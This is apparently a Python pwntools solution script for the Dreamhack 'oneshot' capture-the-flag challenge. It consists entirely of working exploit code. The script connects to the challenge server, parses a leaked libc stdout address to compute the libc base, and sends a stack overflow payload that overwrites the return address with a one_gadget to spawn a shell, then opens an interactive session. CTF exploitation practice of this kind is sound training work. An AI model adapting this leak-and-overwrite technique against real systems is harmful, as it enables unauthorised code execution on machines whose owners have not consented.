from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 13002)
e = ELF('./oneshot')
libc = ELF('./libc.so.6')

one_gadget = 0x45216

p.recvuntil("stdout: ")

stdout = int(p.recvline()[:-1], 16)

base = stdout - libc.symbols['_IO_2_1_stdout_']

one_gadget = base + one_gadget

slog("STDOUT" , stdout)
slog("base", base)
slog("one_gadget", one_gadget)

payload = b'A' * 24
payload += b'\x00' * 8
payload += b'B' * 8
payload += p64(one_gadget)

p.sendafter("MSG: ", payload)

p.interactive()
